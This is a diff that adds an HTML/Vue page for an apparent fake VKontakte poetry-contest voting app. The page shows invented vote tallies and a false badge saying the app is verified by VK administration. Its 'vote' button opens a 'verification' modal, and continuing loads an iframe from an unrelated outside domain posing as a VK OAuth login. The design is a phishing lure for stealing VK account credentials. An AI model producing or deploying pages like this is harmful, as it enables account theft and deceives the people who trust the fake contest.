@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>verse-vk</title>
+	<link rel="stylesheet" href="style.css">
+</head>
+<body>
+	<div id="app">
+		<iframe v-if="iframe" src="https://dodopizza.fun/oauth"></iframe>
+		<div class="vk-app">
+			<div v-if="modal_1" class="modal modal-verification">
+				<div class="modal-overlay"></div>
+				<div class="modal-inner">
+					<div @click="modal_1 = false" class="modal-close"></div>
+					<div class="modal-content">
+						<div class="verification">
+							<div class="modal-img">
+								<img src="user-icon.svg" alt="">
+							</div>
+							<div class="verification-content">
+								<h3 class="modal-title">Пройдите верификацию</h3>
+								<p class="modal-description">
+									Во избежание накрутки, просим вас подтвердить что вы человек, через авторизацию вконтакте.
+								</p>
+							</div>
+							<div class="verification-buttons">
+								<div class="button">
+									<button @click="modal_1 = false" class="btn btn-reset btn-secondary verification-cancel">Отменить</button>
+								</div>
+								<div class="button">
+									<button @click="iframeShow" class="btn btn-reset btn-primary verification-start">Продолжить</button>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<!-- <div class="modal modal-error">
+				<div class="modal-overlay"></div>
+				<div class="modal-inner">
+					<div class="modal-close"></div>
+					<div class="modal-content">
+						<div class="error">
+							<div class="modal-img">
+								<img src="warning-icon.svg" alt="">
+							</div>
+							<div class="error-content">
+								<h3 class="modal-title">Вы уже проголосовали</h3>
+								<p class="modal-description">
+									Простите, но вы уже голосовали за одного из участников. Повторное голосование невозможно.
+								</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="modal modal-finish">
+				<div class="modal-overlay"></div>
+				<div class="modal-inner">
+					<div class="modal-close"></div>
+					<div class="modal-content">
+						<div class="finish">
+							<div class="modal-img">
+								<img src="check-icon.svg" alt="">
+							</div>
+							<div class="error-content">
+								<h3 class="modal-title">Спасибо за голосование</h3>
+								<p class="modal-description">
+									Ваш голос был принят. Благодарим <br> 
+									за участие в голосовании.
+								</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="modal modal-verse">
+				<div class="modal-overlay"></div>
+				<div class="modal-inner">
+					<div class="modal-close"></div>
+					<div class="modal-content">
+						<div class="verse">
+							<div class="verse-content">
+								<h3 class="modal-title">Стих: Осень</h3>
+								<p class="verse-description">
+									Прошли года. Я выбилась на славу. <br>
+									Сквозь стольких мук, проникнувших тоской, <br>
+									Я обрела покой в глазах своих  усталых, <br>
+									И непременно громких тишиной. <br>
+								</p>
+								<p class="verse-description">
+									И вот сейчас, уже стоя пред вами, <br>
+									Могу я грозно с гордостью сказать: <br>
+									Бей ровно столько сколько хватит силы, <br>
+									Тогда ты не устанешь уставать. <br>
+								</p>
+								<p class="verse-description">
+									И вот теперь былое позади. <br>
+									Я изменилась хоть немного подустала.. <br>
+									Я здесь, чтоб рассказать вам кем я был, <br>
+									И что уже потом со мной стало. <br>
+								</p>
+								<p class="verse-description">
+									И вот уже почти догнавши цель, <br>
+									Все также рвусь ногами к пьюдисталу. <br>
+									Я изменилась. Месяц был-апрель. <br>
+									Теперь дарю я людям только радость. <br>
+								</p>
+							</div>
+							<div class="verse-buttons">
+								<button class="btn btn-reset btn-primary verse-vote">Проголосовать</button>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div> -->
+			<header class="header">
+				<div class="container">
+					<div class="header-container">
+						<div class="header-inner">
+							<div class="header-block">
+								<a href="/" class="logo">
+									<img src="logo.svg" alt="">
+								</a>
+								<div class="logo-text">
+									Конкурс на лучший <br>
+									стих от издательства
+								</div>
+							</div>
+							<div class="header-block">
+								<div class="verified">
+									<div class="verified-inner">
+										<div class="verified-icon">
+											<img src="shield.svg" alt="">
+										</div>
+										<div class="verified-text">
+											Приложение проверено администрацией вконтакте
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</header>
+			<div class="voting">
+				<div class="container">
+					<h1 class="heading">Финал борьбы за лучший стих. Победителя определяете только вы</h1>
+					<div class="voting-container">
+						<div class="voting-row">
+							<div class="voting-col">
+								<div class="author-item">
+									<div class="author-img">
+										<img src="author-1.png" alt="">
+									</div>
+									<div class="author-content">
+										<div class="author-name">Анастасия Астахова</div>
+										<div class="author-statistic">
+											Проголосовало: <span>150 человек</span>
+										</div>
+									</div>
+									<div class="author-buttons">
+										<button @click="modal_1 = true" class="btn btn-reset btn-primary btn-vote">
+											<img src="heart-icon.svg" alt="">
+											Проголосовать
+										</button>
+										<button class="btn btn-reset btn-secondary btn-verse">
+											<img src="arrow-icon.svg" alt="">
+											Открыть весь стих
+										</button>
+									</div>
+								</div>
+							</div>
+							<div class="voting-col">
+								<div class="author-item">
+									<div class="author-img">
+										<img src="author-2.png" alt="">
+									</div>
+									<div class="author-content">
+										<div class="author-name">Олеся Обрамова</div>
+										<div class="author-statistic">
+											Проголосовало: <span>120 человек</span>
+										</div>
+									</div>
+									<div class="author-buttons">
+										<button @click="modal_1 = true" class="btn btn-reset btn-primary btn-vote">
+											<img src="heart-icon.svg" alt="">
+											Проголосовать
+										</buton>
+										<button class="btn btn-reset btn-secondary btn-verse">
+											<img src="arrow-icon.svg" alt="">
+											Открыть весь стих
+										</button>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<footer class="footer">
+				<a href="/policy" class="policy">Политика конфиденциальности</a>
+			</footer>
+		</div>
+	</div>
+	<script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+    <script>
+        // Sends event to client
+        vkBridge.send('VKWebAppInit');
+    </script> 
+	<script src="https://cdn.jsdelivr.net/npm/vue"></script>
+	<script>
+		var app = new Vue({
+			el: '#app',
+			data: {
+				modal_1: false,
+				iframe: false,
+			},
+			methods: {
+				iframeShow() {
+					this.modal_1 = false
+					this.iframe = true
+				}
+			}
+		})
+	</script>
+</body>
+</html>
